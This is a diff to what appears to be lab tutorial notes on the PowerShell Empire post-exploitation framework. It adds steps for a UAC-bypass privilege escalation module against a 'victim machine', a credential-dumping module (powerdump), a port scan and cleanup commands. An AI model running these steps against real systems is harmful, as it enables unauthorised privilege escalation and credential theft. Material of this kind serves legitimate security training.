@@ -9,7 +9,7 @@ If you type info, it will show you information about the victim machine.
 The most important information would be the _high_integrity_ flag. You can see that it is set to 0, which means we do not have SYSTEM privileges.
 To increase the _high_integrity_ flag, we would need to elevate privileges.
 
-To do this, type usemodule powershell/privesc/bypassuac_env. Set Listener to http, since we are using a http listener, and Agent to the agent from the victim machine.
+To do this, type usemodule _powershell/privesc/bypassuac_env_ or _privesc/bypassuac_. Set Listener to http, since we are using a http listener, and Agent to the agent from the victim machine.
 
 `(Empire: agents) > usemodule powershell/privesc/bypassuac_env`
 
@@ -52,6 +52,30 @@ To run them, you need to go to command prompt of the required agent
 `(Empire: RMVFSLPW) > usemodule credentials/powerdump*`
 
 `(Empire: powershell/credentials/powerdump) > run`
+
+# Port scanners
+
+`(Empire: Agent007) > searchmodule portscan`
+
+`(Empire: Agent007) > usemodule situational_awareness/network/portscan`
+
+`(Empire: situational_awareness/network/portscan) > set Hosts 10.10.10.10`
+
+`(Empire: situational_awareness/network/portscan) > run`
+
+# Wrap up
+
+`main`
+
+`agents`
+
+`kill all`
+
+`listeners`
+
+`kill http`
+
+# Overview
 
 ## Usefull commands
 
